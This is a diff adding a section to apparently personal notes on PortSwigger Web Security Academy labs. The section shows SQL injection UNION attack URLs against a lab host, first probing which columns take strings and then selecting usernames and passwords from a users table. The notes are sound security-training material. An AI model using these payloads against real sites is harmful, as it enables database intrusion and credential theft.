@@ -872,7 +872,14 @@ https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?categor
 
 In this text only the second column takes string data type
 __________________________________________________________________________________________________________________________________________________________________
+SQL injection UNION attack, retrieving data from other tables
+-------------------------------------------------------------
+https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,'abcd','efg'--
 
+Those two column can accept string data so that we have to retrieve username and password from users table
+
+https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,username,password from users--
+__________________________________________________________________________________________________________________________________________________________________
 
 
 
